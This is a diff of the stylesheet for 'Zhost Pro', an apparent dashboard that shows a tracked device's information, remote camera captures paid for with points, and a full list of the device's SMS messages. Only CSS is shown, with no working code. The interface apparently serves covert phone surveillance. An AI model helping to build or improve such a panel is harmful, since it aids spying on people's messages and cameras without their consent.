@@ -3,724 +3,596 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="theme-color" content="#0F172A">
+<meta name="theme-color" content="#0f172a">
 <title>Zhost Pro</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-
-  :root{
-    --bg:#0F172A;
-    --surface:#1E293B;
-    --primary:#38BDF8;
-    --primary-dark:#0284C7;
-    --text:#E2E8F0;
-    --text-2:#CBD5E1;
-    --text-3:#94A3B8;
-    --line:#334155;
-    --line-2:#263449;
-    --success:#22C55E;
-    --success-bg:#064E3B;
-    --info:#38BDF8;
-    --info-bg:#0C4A6E;
-    --danger:#EF4444;
-    --shadow-sm:0 1px 2px rgba(15,23,42,.04);
-    --shadow-md:0 4px 12px rgba(15,23,42,.06);
-    --shadow-lg:0 12px 32px rgba(15,23,42,.10);
-    --radius:14px;
-  }
-
   html,body{
-    height:100%;
-    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
-    background:var(--bg);
-    color:var(--text);
-    font-size:15px;
-    line-height:1.5;
-    -webkit-font-smoothing:antialiased;
-    -moz-osx-font-smoothing:grayscale;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+    background:#0f172a;color:#e2e8f0;min-height:100vh;
   }
-  body{display:flex;flex-direction:column;min-height:100vh;overflow-x:hidden}
-  button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
-  img{display:block;max-width:100%}
+  body{padding:16px;display:flex;align-items:flex-start;justify-content:center}
+  .container{max-width:900px;width:100%;margin:0 auto}
 
-  /* ═══════════════════════════════════
-     LOGIN
-     ═══════════════════════════════════ */
-  #loginScreen{
-    display:flex;flex-direction:column;justify-content:center;align-items:center;
-    min-height:100vh;padding:28px 22px;background:var(--surface);
+  /* ── Toast ── */
+  #toastContainer{
+    position:fixed;top:16px;left:50%;transform:translateX(-50%);
+    z-index:9999;display:flex;flex-direction:column;gap:8px;
+    width:calc(100% - 32px);max-width:500px;pointer-events:none;
   }
-  .login-wrap{width:100%;max-width:400px}
-  .logo-mark{
-    width:64px;height:64px;border-radius:18px;
-    background:linear-gradient(135deg,#1689FF,#21A8FF);
-    display:flex;align-items:center;justify-content:center;
-    margin:0 auto 22px;
-    box-shadow:0 10px 24px rgba(22,137,255,.28);
+  .toast{
+    padding:12px 16px;border-radius:10px;
+    font-size:13px;font-weight:500;color:white;
+    box-shadow:0 8px 24px rgba(0,0,0,.4);
+    animation:slideDown .3s ease-out;
+    line-height:1.4;pointer-events:auto;
+    display:flex;align-items:center;gap:10px;
   }
-  .logo-mark svg{width:30px;height:30px;fill:#fff}
-  .login-title{font-size:24px;font-weight:700;text-align:center;color:var(--text);letter-spacing:-.4px;margin-bottom:6px}
-  .login-sub{font-size:13.5px;color:var(--text-3);text-align:center;margin-bottom:32px}
+  .toast.error{background:#dc2626;border-left:4px solid #fca5a5}
+  .toast.success{background:#16a34a;border-left:4px solid #86efac}
+  .toast.info{background:#2563eb;border-left:4px solid #93c5fd}
+  .toast.warning{background:#d97706;border-left:4px solid #fcd34d}
+  @keyframes slideDown{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
+  @keyframes fadeOut{from{opacity:1}to{opacity:0;transform:translateY(-20px)}}
+  .toast.hiding{animation:fadeOut .3s ease-in forwards}
 
-  .form-group{margin-bottom:16px}
-  .form-label{
-    display:block;font-size:12.5px;font-weight:600;
-    color:var(--text-2);margin-bottom:8px;letter-spacing:.1px;
+  /* ── Login ── */
+  #loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;width:100%}
+  .login-box{
+    width:100%;max-width:400px;background:#1e293b;
+    padding:32px;border-radius:16px;
+    box-shadow:0 20px 60px rgba(0,0,0,0.5);
   }
-  .form-input{
-    width:100%;padding:14px 15px;
-    border:1.5px solid var(--line);border-radius:12px;
-    font-size:15px;color:var(--text);background:#FBFCFE;
+  .login-box h2{
+    color:#38bdf8;margin-bottom:24px;
+    display:flex;align-items:center;justify-content:center;gap:10px;
+    font-size:22px;
+  }
+  .login-box input{
+    width:100%;padding:14px 16px;margin-bottom:16px;
+    background:#0f172a;border:1px solid #334155;
+    border-radius:8px;color:#e2e8f0;font-size:15px;
     font-family:inherit;outline:none;
-    transition:all .18s ease;
   }
-  .form-input:focus{
-    border-color:var(--primary);
-    background:#fff;
-    box-shadow:0 0 0 4px rgba(22,137,255,.10);
+  .login-box input:focus{border-color:#38bdf8}
+  .login-box input::placeholder{color:#64748b}
+  .login-box button{
+    width:100%;padding:14px;background:#38bdf8;color:#0f172a;
+    border:none;border-radius:8px;font-size:16px;font-weight:700;
+    cursor:pointer;margin-top:8px;
   }
-  .form-input::placeholder{color:#B8C4D6}
+  .login-box button:disabled{background:#475569;cursor:not-allowed}
+  .error-msg{color:#f87171;font-size:14px;margin-top:12px;text-align:center;min-height:20px}
 
-  .btn{
-    width:100%;padding:15px;border-radius:12px;
-    font-size:15px;font-weight:600;letter-spacing:.1px;
-    display:flex;align-items:center;justify-content:center;gap:9px;
-    transition:all .15s ease;
-  }
-  .btn-primary{
-    background:linear-gradient(135deg,#0ea5e9,#2563eb);
-    color:#fff;
-    box-shadow:0 6px 16px rgba(22,137,255,.28);
-  }
-  .btn-primary:active{transform:scale(.98);box-shadow:0 3px 8px rgba(22,137,255,.24)}
-  .btn-primary:disabled{opacity:.65;cursor:not-allowed;transform:none}
+  /* ── Loading ── */
+  #loadingScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;width:100%}
+  #loadingScreen svg{animation:spin 1s linear infinite}
+  @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
 
-  .alert{
-    padding:13px 15px;border-radius:11px;
-    font-size:13px;font-weight:500;line-height:1.5;
-    margin-bottom:16px;display:none;
-    border:1px solid transparent;
-  }
-  .alert.show{display:block}
-  .alert-error{background:#FEF2F2;color:#B91C1C;border-color:#FECACA}
+  /* ── Dashboard ── */
+  #dashScreen{width:100%}
 
-  /* ═══════════════════════════════════
-     APP SHELL
-     ═══════════════════════════════════ */
-  #appScreen{display:none;flex-direction:column;min-height:100vh;padding-bottom:84px}
-  #appScreen.show{display:flex}
+  .header{
+    display:flex;justify-content:space-between;align-items:center;
+    margin-bottom:16px;padding:14px 18px;
+    background:#1e293b;border-radius:12px;gap:8px;flex-wrap:wrap;
+  }
+  .header h1{
+    font-size:18px;color:#38bdf8;flex:1;min-width:150px;
+    display:flex;align-items:center;gap:8px;
+  }
+  .live-badge{
+    display:inline-flex;align-items:center;gap:5px;
+    padding:3px 8px;background:#065f46;color:#6ee7b7;
+    border-radius:12px;font-size:10px;font-weight:700;
+  }
+  .live-dot{
+    width:6px;height:6px;border-radius:50%;
+    background:#10b981;animation:pulse 1.5s infinite;
+  }
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
 
-  /* Top Header */
-  .app-header{
-    background:var(--surface);
-    padding:16px 20px;
-    display:flex;align-items:center;justify-content:space-between;
-    border-bottom:1px solid var(--line);
-    position:sticky;top:0;z-index:20;
-  }
-  .app-title{
-    font-size:17px;font-weight:700;letter-spacing:-.2px;
-    color:var(--text);display:flex;align-items:center;gap:9px;
-  }
-  .app-title-dot{
-    width:8px;height:8px;border-radius:50%;
-    background:var(--success);
-    box-shadow:0 0 0 3px rgba(16,185,129,.15);
-  }
-  .app-user{
-    font-size:12px;font-weight:600;color:var(--text-2);
-    background:var(--line-2);
-    padding:5px 12px;border-radius:20px;
-    max-width:120px;
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+  .logout-btn{
+    padding:8px 14px;background:#ef4444;color:white;
+    border:none;border-radius:8px;cursor:pointer;font-size:13px;
+    display:flex;align-items:center;gap:6px;font-weight:600;
   }
 
-  /* Bottom Nav */
-  .bottom-nav{
-    position:fixed;
-    bottom:0;left:0;right:0;
-    background:rgba(255,255,255,.96);
-    backdrop-filter:saturate(180%) blur(20px);
-    -webkit-backdrop-filter:saturate(180%) blur(20px);
-    border-top:1px solid var(--line);
-    display:grid;grid-template-columns:repeat(4,1fr);
-    padding:8px 8px 10px;
-    z-index:30;
-    max-width:720px;
-    margin:0 auto;
+  .device-info{
+    background:#1e293b;padding:14px 16px;border-radius:10px;
+    margin-bottom:16px;font-size:13px;color:#94a3b8;line-height:1.8;
   }
-  .nav-item{
-    display:flex;flex-direction:column;align-items:center;gap:3px;
-    padding:8px 4px;border-radius:12px;
-    color:var(--text-3);
-    font-size:10.5px;font-weight:600;letter-spacing:.1px;
-    transition:color .18s ease;
-    user-select:none;
-  }
-  .nav-item svg{width:22px;height:22px;fill:currentColor;transition:transform .18s ease}
-  .nav-item:active svg{transform:scale(.9)}
-  .nav-item.active{color:var(--primary)}
-  .nav-item.active svg{fill:var(--primary)}
+  .device-info strong{color:#e2e8f0}
 
-  /* Section */
-  .section{display:none;padding:20px 18px 24px;max-width:720px;margin:0 auto;width:100%}
-  .section.active{display:block;animation:fadeUp .22s ease}
-  @keyframes fadeUp{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+  /* ── Menu Button List ── */
+  .btn-list{display:flex;flex-direction:column;gap:8px;margin-bottom:16px}
+  .tab-btn{
+    width:100%;padding:14px 18px;background:#1e293b;
+    border:1px solid #334155;border-radius:10px;
+    color:#e2e8f0;font-size:15px;font-weight:500;
+    cursor:pointer;display:flex;align-items:center;
+    justify-content:space-between;text-align:left;transition:all 0.2s;
+    font-family:inherit;
+  }
+  .tab-btn .btn-left{display:flex;align-items:center;gap:12px}
+  .tab-btn .tab-icon{
+    width:22px;height:22px;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .tab-btn .tab-icon svg{width:20px;height:20px}
+  .tab-btn .arrow{color:#64748b;font-size:20px;line-height:1}
+  .tab-btn:hover{background:#293548;border-color:#38bdf8}
+  .tab-btn.active{background:#38bdf8;color:#0f172a;border-color:#38bdf8}
+  .tab-btn.active .arrow{color:#0f172a}
+
+  .tab-content{display:none}
+  .tab-content.active{display:block}
+
+  /* ── Data Screen ── */
+  #dataScreen{display:none}
+  #dataScreen.show{display:block}
+
+  .back-btn{
+    display:inline-flex;align-items:center;gap:6px;
+    padding:8px 14px;background:#1e293b;
+    border:1px solid #334155;border-radius:8px;
+    color:#94a3b8;font-size:13px;cursor:pointer;margin-bottom:14px;
+    font-family:inherit;
+  }
+  .back-btn:hover{border-color:#38bdf8;color:#38bdf8}
 
   .page-title{
-    font-size:22px;font-weight:700;letter-spacing:-.4px;
-    color:var(--text);margin-bottom:4px;
-  }
-  .page-sub{
-    font-size:13px;color:var(--text-3);margin-bottom:22px;
-  }
-
-  /* ═══════════════════════════════════
-     CAMERA
-     ═══════════════════════════════════ */
-  .cam-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px}
-  .cam-card{
-    background:var(--surface);
-    border:1px solid var(--line);
-    border-radius:var(--radius);
-    padding:20px 12px;
-    display:flex;flex-direction:column;align-items:center;gap:10px;
-    transition:all .15s ease;
-    box-shadow:var(--shadow-sm);
-  }
-  .cam-card:active{transform:scale(.97);background:#FBFCFE}
-  .cam-card-icon{
-    width:48px;height:48px;border-radius:14px;
-    background:linear-gradient(135deg,#1689FF,#21A8FF);
-    display:flex;align-items:center;justify-content:center;
-    box-shadow:0 6px 14px rgba(22,137,255,.24);
-  }
-  .cam-card-icon svg{width:24px;height:24px;fill:#fff}
-  .cam-card-name{font-size:14px;font-weight:700;color:var(--text)}
-  .cam-card-cost{font-size:11.5px;color:var(--text-3);font-weight:500}
-
-  .stat-card{
-    background:var(--surface);
-    border:1px solid var(--line);
-    border-radius:var(--radius);
-    padding:16px 18px;
-    display:flex;align-items:center;justify-content:space-between;
-    margin-bottom:10px;
-    box-shadow:var(--shadow-sm);
-  }
-  .stat-label{font-size:13px;color:var(--text-3);font-weight:500}
-  .stat-value{font-size:15px;color:var(--text);font-weight:700}
-
-  /* ═══════════════════════════════════
-     SMS LIST (Chat style)
-     ═══════════════════════════════════ */
-  .list-header{
-    display:flex;align-items:center;justify-content:space-between;
-    margin-bottom:16px;
-  }
-  .list-header h2{font-size:22px;font-weight:700;letter-spacing:-.4px;color:var(--text)}
-  .icon-btn{
-    width:38px;height:38px;border-radius:11px;
-    background:var(--surface);
-    border:1px solid var(--line);
-    display:flex;align-items:center;justify-content:center;
-    transition:all .15s ease;
-    box-shadow:var(--shadow-sm);
-  }
-  .icon-btn:active{transform:scale(.94);background:#F1F5FA}
-  .icon-btn svg{width:17px;height:17px;fill:var(--text-2)}
-
-  .chat-list{
-    background:var(--surface);
-    border:1px solid var(--line);
-    border-radius:var(--radius);
-    overflow:hidden;
-    box-shadow:var(--shadow-sm);
-  }
-  .chat-row{
-    display:flex;align-items:center;gap:13px;
-    padding:14px 16px;
-    border-bottom:1px solid var(--line-2);
-    transition:background .12s ease;
-    cursor:pointer;
-  }
-  .chat-row:last-child{border-bottom:none}
-  .chat-row:active{background:#F7F9FC}
-
-  .chat-avatar{
-    width:46px;height:46px;border-radius:50%;
-    display:flex;align-items:center;justify-content:center;
-    font-size:16px;font-weight:700;color:#fff;
-    flex-shrink:0;
-    letter-spacing:-.3px;
-  }
-  .chat-avatar.in{background:linear-gradient(135deg,#10B981,#059669)}
-  .chat-avatar.out{background:linear-gradient(135deg,#3B82F6,#1D4ED8)}
-  .chat-avatar.batch{background:linear-gradient(135deg,#8B5CF6,#6D28D9)}
-
-  .chat-main{flex:1;min-width:0}
-  .chat-top{display:flex;align-items:baseline;justify-content:space-between;gap:10px;margin-bottom:3px}
-  .chat-name{
-    font-size:14.5px;font-weight:600;color:var(--text);
-    letter-spacing:-.1px;
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-  }
-  .chat-time{
-    font-size:11.5px;color:var(--text-3);flex-shrink:0;font-weight:500;
-  }
-  .chat-preview{
-    font-size:13px;color:var(--text-3);
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-    line-height:1.4;
-  }
-  .chat-badge{
-    display:inline-block;
-    font-size:9.5px;font-weight:700;letter-spacing:.4px;
-    padding:2px 7px;border-radius:5px;
-    margin-right:5px;
-    text-transform:uppercase;
-    vertical-align:middle;
-  }
-  .chat-badge.in{background:var(--success-bg);color:#047857}
-  .chat-badge.out{background:var(--info-bg);color:#1D4ED8}
-  .chat-badge.batch{background:#F3E8FF;color:#6D28D9}
-
-  /* ═══════════════════════════════════
-     SMS DETAIL (Full page)
-     ═══════════════════════════════════ */
-  .detail-page{
-    position:fixed;inset:0;
-    background:var(--bg);
-    z-index:100;
-    display:flex;flex-direction:column;
-    transform:translateX(100%);
-    transition:transform .28s cubic-bezier(.4,0,.2,1);
-    will-change:transform;
-  }
-  .detail-page.show{transform:translateX(0)}
-
-  .detail-header{
-    background:var(--surface);
-    padding:14px 16px;
-    display:flex;align-items:center;gap:12px;
-    border-bottom:1px solid var(--line);
-    position:sticky;top:0;z-index:5;
-  }
-  .back-btn{
-    width:38px;height:38px;border-radius:50%;
-    display:flex;align-items:center;justify-content:center;
-    transition:background .15s ease;
-    flex-shrink:0;
-  }
-  .back-btn:active{background:#F1F5FA}
-  .back-btn svg{width:20px;height:20px;fill:var(--text-2)}
-
-  .detail-info{flex:1;min-width:0}
-  .detail-name{
-    font-size:15.5px;font-weight:700;color:var(--text);
-    letter-spacing:-.1px;
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-  }
-  .detail-sub{
-    font-size:12px;color:var(--text-3);font-weight:500;
-    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
-    margin-top:1px;
-  }
-
-  .detail-body{
-    flex:1;overflow-y:auto;
-    padding:20px 18px 40px;
-    max-width:720px;margin:0 auto;width:100%;
-    display:flex;flex-direction:column;gap:14px;
-  }
-
-  /* Message bubble */
-  .msg-bubble{
-    background:var(--surface);
-    border:1px solid var(--line);
-    border-radius:16px;
-    padding:14px 16px;
-    max-width:88%;
-    align-self:flex-start;
-    box-shadow:var(--shadow-sm);
-    animation:fadeUp .25s ease;
-  }
-  .msg-bubble.out{
-    align-self:flex-end;
-    background:linear-gradient(135deg,#0ea5e9,#2563eb);
-    border-color:transparent;
-    color:#fff;
-  }
-  .msg-bubble.out .msg-text{color:#fff}
-  .msg-bubble.out .msg-time{color:rgba(255,255,255,.75)}
-  .msg-text{
-    font-size:14.5px;color:var(--text);line-height:1.55;
-    white-space:pre-wrap;word-break:break-word;
-  }
-  .msg-time{
-    font-size:11px;color:var(--text-3);font-weight:500;
-    margin-top:8px;text-align:right;
-  }
-
-  .msg-header{
+    font-size:18px;color:#38bdf8;margin-bottom:14px;font-weight:700;
     display:flex;align-items:center;gap:10px;
-    padding:12px 0 4px;
-    font-size:12px;color:var(--text-3);font-weight:600;
+  }
+  .page-title svg{width:22px;height:22px}
+
+  .stats{
+    display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));
+    gap:10px;margin-bottom:16px;
+  }
+  .stat-card{
+    background:#1e293b;padding:14px 10px;border-radius:10px;text-align:center;
+  }
+  .stat-card .num{font-size:24px;font-weight:700;color:#38bdf8}
+  .stat-card .lbl{font-size:11px;color:#94a3b8;margin-top:4px;text-transform:uppercase;letter-spacing:.5px}
+
+  .info-bar{
+    background:#1e293b;padding:10px 14px;border-radius:8px;
+    margin-bottom:12px;font-size:12px;color:#38bdf8;text-align:center;
+  }
+
+  .placeholder{
+    text-align:center;padding:50px 20px;color:#94a3b8;
+    background:#1e293b;border-radius:10px;
+  }
+  .placeholder .icon{
+    display:flex;align-items:center;justify-content:center;margin-bottom:16px;
+  }
+  .placeholder .icon svg{width:48px;height:48px}
+  .placeholder h3{color:#e2e8f0;font-size:17px;margin-bottom:8px}
+  .placeholder p{font-size:13px;line-height:1.6}
+
+  /* ── Camera Cards ── */
+  .cam-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+  .cam-card{
+    background:#1e293b;border:1px solid #334155;
+    border-radius:12px;padding:22px 12px;
+    display:flex;flex-direction:column;align-items:center;gap:10px;
+    cursor:pointer;transition:.15s;font-family:inherit;
+    color:#e2e8f0;
+  }
+  .cam-card:active{transform:scale(.97);background:#293548}
+  .cam-card-icon{
+    width:52px;height:52px;border-radius:50%;
+    background:linear-gradient(135deg,#38bdf8,#0ea5e9);
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 6px 18px rgba(56,189,248,.28);
+  }
+  .cam-card-icon svg{width:26px;height:26px;fill:#0f172a}
+  .cam-card-name{font-size:14px;font-weight:700;color:#e2e8f0}
+  .cam-card-cost{font-size:11.5px;color:#64748b;font-weight:500}
+
+  /* ── SMS List (Device Tracker style — ALL SHOWN) ── */
+  .sms-list{display:flex;flex-direction:column;gap:10px}
+  .sms-item{
+    background:#1e293b;border-radius:10px;
+    padding:12px 14px;
+    border-left:3px solid #38bdf8;
+  }
+  .sms-item.out{border-left-color:#f59e0b}
+  .sms-item.batch{border-left-color:#a855f7}
+  .sms-item .top{
+    display:flex;justify-content:space-between;
+    font-size:11px;color:#94a3b8;margin-bottom:6px;gap:8px;
+  }
+  .sms-item .phone{
+    color:#38bdf8;font-weight:600;font-size:13px;
+    word-break:break-all;
+  }
+  .sms-item.out .phone{color:#f59e0b}
+  .sms-item.batch .phone{color:#a855f7}
+  .sms-item .msg{
+    color:#e2e8f0;font-size:13px;line-height:1.5;
+    word-wrap:break-word;white-space:pre-wrap;
+  }
+  .sms-item .dir-badge{
+    display:inline-block;padding:2px 7px;border-radius:4px;
+    font-size:10px;font-weight:700;margin-right:5px;
+    text-transform:uppercase;letter-spacing:.4px;
+  }
+  .dir-in{background:#16a34a;color:white}
+  .dir-out{background:#f59e0b;color:white}
+  .dir-batch{background:#a855f7;color:white}
+
+  /* ── Photo Grid ── */
+  .photo-header{
+    display:flex;justify-content:space-between;align-items:center;
+    margin:20px 0 12px;
+  }
+  .photo-header h3{
+    font-size:13px;color:#94a3b8;font-weight:700;
     text-transform:uppercase;letter-spacing:.5px;
   }
-  .msg-header-line{flex:1;height:1px;background:var(--line)}
-
-  .detail-empty{
-    display:flex;flex-direction:column;align-items:center;justify-content:center;
-    height:100%;padding:40px 20px;gap:14px;
-    color:var(--text-3);
+  .photo-count{
+    font-size:12px;color:#64748b;background:#1e293b;
+    padding:4px 10px;border-radius:12px;border:1px solid #334155;
+    font-weight:600;
   }
-  .detail-empty svg{width:52px;height:52px;fill:var(--line)}
-  .detail-empty-text{font-size:14px;font-weight:500}
-
-  .camera-photos{
-    margin-top:20px;padding:16px;background:var(--surface);
-    border:1px solid var(--line);border-radius:var(--radius);
-    box-shadow:var(--shadow-sm);
+  .photo-grid{
+    display:grid;grid-template-columns:repeat(3,1fr);gap:6px;
   }
-  .camera-photos-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
-  .camera-photos-title{font-size:16px;font-weight:700;color:var(--text)}
-  .camera-photos-sub{font-size:11.5px;color:var(--text-3);margin-top:2px}
-  .camera-photos .icon-btn{width:34px;height:34px}
-
-  /* ═══════════════════════════════════
-     PHOTOS
-     ═══════════════════════════════════ */
-  .photo-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:4px;margin-top:4px}
-  @media(min-width:600px){.photo-grid{grid-template-columns:repeat(4,1fr);gap:6px}}
-  .photo-item{
-    aspect-ratio:1;border-radius:10px;overflow:hidden;
-    background:var(--line-2);cursor:pointer;position:relative;
+  @media(min-width:600px){.photo-grid{grid-template-columns:repeat(4,1fr)}}
+  .photo-tile{
+    position:relative;aspect-ratio:1/1;background:#1e293b;
+    border-radius:8px;overflow:hidden;cursor:pointer;
+    border:1px solid #334155;transition:.15s;
   }
-  .photo-item img{width:100%;height:100%;object-fit:cover;opacity:0;transition:opacity .3s ease}
-  .photo-item img.loaded{opacity:1}
-  .photo-item .spinner{
+  .photo-tile:hover{border-color:#38bdf8}
+  .photo-tile img{width:100%;height:100%;object-fit:cover;display:block}
+  .photo-tile .spinner{
     position:absolute;top:50%;left:50%;
     transform:translate(-50%,-50%);
     width:20px;height:20px;
-    border:2.5px solid var(--line);border-top-color:var(--primary);
+    border:2.5px solid #334155;border-top-color:#38bdf8;
     border-radius:50%;animation:spin .8s linear infinite;
   }
-  @keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
-
-  .empty-state{
-    text-align:center;padding:60px 20px;color:var(--text-3);
+  .photo-tile .pdate{
+    position:absolute;bottom:0;left:0;right:0;
+    background:linear-gradient(to top,rgba(0,0,0,.9),transparent);
+    color:white;font-size:9px;padding:14px 6px 4px;
+    text-align:center;white-space:nowrap;
+    overflow:hidden;text-overflow:ellipsis;
   }
-  .empty-state svg{width:56px;height:56px;fill:var(--line);margin-bottom:14px}
-  .empty-state p{font-size:14px;font-weight:500}
 
-  /* ═══════════════════════════════════
-     PROFILE
-     ═══════════════════════════════════ */
+  /* ── Profile ── */
   .profile-hero{
-    background:linear-gradient(135deg,#0ea5e9,#2563eb);
-    border-radius:18px;
-    padding:26px 22px;
-    color:#fff;
-    margin-bottom:20px;
-    box-shadow:0 12px 28px rgba(22,137,255,.24);
-    position:relative;
-    overflow:hidden;
+    background:linear-gradient(135deg,#38bdf8,#0ea5e9);
+    border-radius:14px;padding:24px;color:#0f172a;
+    margin-bottom:18px;box-shadow:0 12px 28px rgba(56,189,248,.28);
+    position:relative;overflow:hidden;
   }
   .profile-hero::after{
-    content:"";position:absolute;
-    top:-40px;right:-40px;
+    content:"";position:absolute;top:-40px;right:-40px;
     width:140px;height:140px;border-radius:50%;
-    background:rgba(255,255,255,.08);
+    background:rgba(15,23,42,.08);
   }
   .profile-avatar{
-    width:54px;height:54px;border-radius:50%;
-    background:rgba(255,255,255,.22);
+    width:56px;height:56px;border-radius:50%;
+    background:rgba(15,23,42,.2);
     display:flex;align-items:center;justify-content:center;
-    font-size:22px;font-weight:700;
-    margin-bottom:14px;
-    backdrop-filter:blur(10px);
+    font-size:22px;font-weight:800;
+    margin-bottom:14px;position:relative;z-index:1;
   }
-  .profile-name{font-size:19px;font-weight:700;letter-spacing:-.2px;margin-bottom:3px;position:relative;z-index:1}
-  .profile-email{font-size:12.5px;opacity:.85;word-break:break-all;position:relative;z-index:1}
+  .profile-name{
+    font-size:19px;font-weight:800;margin-bottom:3px;
+    position:relative;z-index:1;
+  }
+  .profile-email{
+    font-size:12.5px;opacity:.75;word-break:break-all;
+    position:relative;z-index:1;
+  }
   .profile-points{
     display:inline-flex;align-items:center;gap:8px;
-    background:rgba(255,255,255,.18);
+    background:rgba(15,23,42,.2);
     padding:8px 15px;border-radius:20px;
     font-size:14px;font-weight:700;
-    margin-top:16px;
-    backdrop-filter:blur(10px);
-    position:relative;z-index:1;
+    margin-top:16px;position:relative;z-index:1;
   }
   .profile-points svg{width:15px;height:15px;fill:#FFD700}
 
   .menu-group{
-    background:var(--surface);
-    border:1px solid var(--line);
-    border-radius:var(--radius);
-    overflow:hidden;
-    box-shadow:var(--shadow-sm);
-    margin-bottom:16px;
+    background:#1e293b;border:1px solid #334155;
+    border-radius:12px;overflow:hidden;margin-bottom:16px;
   }
   .menu-row{
     display:flex;align-items:center;justify-content:space-between;
-    padding:15px 18px;
-    border-bottom:1px solid var(--line-2);
-    font-size:14px;
+    padding:14px 16px;border-bottom:1px solid #334155;
+    font-size:13.5px;
   }
   .menu-row:last-child{border-bottom:none}
-  .menu-label{color:var(--text-3);font-weight:500}
-  .menu-value{color:var(--text);font-weight:600;font-size:13.5px;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:right}
-
-  .logout-btn{
-    width:100%;padding:15px;
-    background:var(--surface);
-    border:1px solid #FECACA;
-    border-radius:var(--radius);
-    color:#DC2626;
-    font-size:14.5px;font-weight:600;
-    display:flex;align-items:center;justify-content:center;gap:9px;
-    transition:all .15s ease;
-    box-shadow:var(--shadow-sm);
+  .menu-label{color:#94a3b8;font-weight:500}
+  .menu-value{
+    color:#e2e8f0;font-weight:600;font-size:13px;
+    max-width:60%;overflow:hidden;text-overflow:ellipsis;
+    white-space:nowrap;text-align:right;
   }
-  .logout-btn:active{background:#FEF2F2;transform:scale(.98)}
-  .logout-btn svg{width:17px;height:17px;fill:#DC2626}
 
-  /* ═══════════════════════════════════
-     OVERLAY / VIEWER / TOAST
-     ═══════════════════════════════════ */
+  /* ── Lightbox ── */
+  .lightbox{
+    display:none;position:fixed;inset:0;
+    background:rgba(0,0,0,.96);
+    z-index:10000;align-items:center;justify-content:center;padding:20px;
+  }
+  .lightbox.show{display:flex}
+  .lightbox img{max-width:100%;max-height:90vh;border-radius:8px}
+  .lightbox-close{
+    position:absolute;top:18px;right:18px;
+    width:42px;height:42px;border-radius:50%;
+    background:#ef4444;color:white;
+    display:flex;align-items:center;justify-content:center;
+    font-size:22px;font-weight:700;cursor:pointer;border:none;
+  }
+
+  /* ── Overlay ── */
   .overlay{
     display:none;position:fixed;inset:0;
-    background:rgba(255,255,255,.92);
+    background:rgba(15,23,42,.92);
     backdrop-filter:blur(4px);
-    z-index:200;
+    z-index:9999;
     align-items:center;justify-content:center;
     flex-direction:column;gap:14px;
   }
   .overlay.show{display:flex}
   .overlay-spinner{
-    width:36px;height:36px;
-    border:3px solid var(--line);border-top-color:var(--primary);
+    width:38px;height:38px;
+    border:3px solid #334155;border-top-color:#38bdf8;
     border-radius:50%;animation:spin2 .8s linear infinite;
   }
   @keyframes spin2{to{transform:rotate(360deg)}}
-  .overlay-text{color:var(--primary);font-size:13px;font-weight:600}
+  .overlay-text{color:#38bdf8;font-size:13px;font-weight:700}
 
-  .lightbox{
-    display:none;position:fixed;inset:0;
-    background:rgba(6,10,20,.96);
-    z-index:150;align-items:center;justify-content:center;padding:20px;
-  }
-  .lightbox.show{display:flex}
-  .lightbox img{max-width:100%;max-height:90vh;border-radius:10px;box-shadow:0 20px 60px rgba(0,0,0,.6)}
-  .lightbox-close{
-    position:absolute;top:18px;right:18px;
-    width:38px;height:38px;border-radius:50%;
-    background:rgba(255,255,255,.15);
-    display:flex;align-items:center;justify-content:center;
-    color:#fff;font-size:20px;
-    backdrop-filter:blur(10px);
-  }
+  .hidden{display:none !important}
 
-  .toast{
-    position:fixed;bottom:100px;left:50%;
-    transform:translateX(-50%) translateY(80px);
-    background:#0F172A;color:#fff;
-    padding:12px 20px;border-radius:12px;
-    font-size:13.5px;font-weight:500;
-    box-shadow:0 12px 32px rgba(0,0,0,.20);
-    z-index:300;opacity:0;
-    transition:all .3s cubic-bezier(.4,0,.2,1);
-    max-width:88vw;text-align:center;
-    pointer-events:none;
-  }
-  .toast.show{transform:translateX(-50%) translateY(0);opacity:1}
-  .toast.success{background:var(--success)}
-  .toast.error{background:var(--danger)}
-
-  /* Dark dashboard styling for this attached build only. */
-  .app-header{background:rgba(15,23,42,.96);border-bottom-color:#334155}
-  .app-user{background:#1e293b;color:#cbd5e1}
-  .bottom-nav{background:rgba(15,23,42,.96);border-top-color:#334155}
-  .stat-card,.cam-card,.chat-list,.menu-group,.form-input,.msg-bubble{background:#1e293b;border-color:#334155}
-  .form-input{color:#e2e8f0;background:#0f172a}
-  .form-input:focus{background:#111827}
-  .chat-name,.stat-value,.menu-label,.detail-name,.profile-name{color:#e2e8f0}
-  .chat-preview,.stat-label,.menu-value,.detail-sub,.page-sub{color:#94a3b8}
-  .detail-page{background:#0f172a}.detail-header{background:#1e293b;border-bottom-color:#334155}
-  .detail-body{color:#e2e8f0}.msg-bubble{color:#e2e8f0}
-  .camera-photos{background:linear-gradient(145deg,#172554,#0f172a)!important;border-color:#334155!important}
